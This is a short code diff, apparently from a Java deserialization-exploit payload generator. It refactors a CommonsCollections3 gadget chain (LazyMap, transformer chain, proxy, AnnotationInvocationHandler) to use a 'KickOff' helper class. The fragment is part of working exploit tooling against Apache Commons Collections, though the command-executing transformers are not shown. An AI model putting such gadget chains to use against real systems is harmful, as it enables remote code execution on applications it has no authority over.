@@ -1,5 +1,6 @@
 package com.ppp.chain.collections3;
 
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -54,9 +55,9 @@ public class CommonsCollections3 implements ObjectPayload<Object> {
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        final Map mapProxy = KickOff.createMemoitizedProxy(lazyMap, Map.class);
 
+        InvocationHandler handler = KickOff.annotationInvocationHandler(mapProxy);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
         return handler;
